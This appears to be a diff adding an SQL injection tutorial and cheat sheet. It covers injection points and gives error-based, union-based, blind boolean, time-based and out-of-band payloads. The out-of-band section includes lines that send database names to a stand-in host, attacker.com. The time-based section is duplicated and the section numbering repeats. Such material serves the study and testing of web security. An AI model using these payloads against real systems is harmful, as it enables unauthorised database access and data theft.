@@ -1,0 +1,115 @@
+2.WHAT IS SQL INJECTION (Quick recap)
+SQL Injection happens when:
+User input is directly inserted into a database query without proper sanitization.
+Example vulnerable code:
+SELECT * FROM users WHERE username = '$input';
+If input = ' OR 1=1--
+Query becomes:
+SELECT * FROM users WHERE username = '' OR 1=1--';
+➡️ Returns ALL users (authentication bypass)
+
+
+2. WHERE TO FIND SQL INJECTION (REAL TARGET SURFACES)
+
+You MUST test every input point:
+
+🔍 Common injection points:
+URL parameters
+  /product?id=1
+POST body
+  username=admin
+JSON APIs
+  { "id": "1" }
+Cookies
+  session=abc123
+HTTP headers
+User-Agent
+Referer
+Hidden fields
+GraphQL inputs
+
+
+3. DETECTION METHODS (DEEP UNDERSTANDING)
+🧨 A. ERROR-BASED SQLi
+🔍 Idea:
+
+Force database to throw errors → reveal info
+
+Payloads:
+'
+" 
+'--
+' OR 1=1--
+Advanced payloads:
+' AND extractvalue(1,concat(0x7e,(SELECT database())))--
+
+(MySQL error-based)
+
+
+B. UNION-BASED SQLi
+🔍 Idea:
+Combine attacker query with original query
+Step 1: Find column count
+?id=1 ORDER BY 1--
+?id=1 ORDER BY 2--
+Until error → column count found
+
+Step 2: Find visible columns
+?id=-1 UNION SELECT 1,2,3--
+
+Step 3: Extract data
+?id=-1 UNION SELECT database(),user(),version()--
+
+
+
+C. BLIND BOOLEAN-BASED SQLi
+🔍 Idea:
+
+No error, no output → only TRUE/FALSE behavior
+
+Payload:
+?id=1 AND 1=1--
+?id=1 AND 1=2--
+Observation:
+Page changes? → TRUE/FALSE detected
+Extract data:
+?id=1 AND substring(database(),1,1)='a'--
+Try all characters → brute-force DB name
+
+
+D. BLIND TIME-BASED SQLi
+🔍 Idea:
+
+Use delay to detect TRUE condition
+
+MySQL:
+?id=1 AND SLEEP(5)--
+PostgreSQL:
+?id=1 AND pg_sleep(5)--
+MSSQL:
+?id=1 WAITFOR DELAY '0:0:5'--
+Data extraction:
+?id=1 AND IF(substring(database(),1,1)='a',SLEEP(5),0)--
+
+D. BLIND TIME-BASED SQLi
+🔍 Idea:
+
+Use delay to detect TRUE condition
+
+MySQL:
+?id=1 AND SLEEP(5)--
+PostgreSQL:
+?id=1 AND pg_sleep(5)--
+MSSQL:
+?id=1 WAITFOR DELAY '0:0:5'--
+Data extraction:
+?id=1 AND IF(substring(database(),1,1)='a',SLEEP(5),0)--
+
+
+E. OUT-OF-BAND (OAST) SQLi
+🔍 Idea:
+Server sends data to your external server
+Payload:
+'; exec xp_dirtree '\\attacker.com\abc'--
+OR MySQL:
+LOAD_FILE(CONCAT('\\\\attacker.com\\',database()))
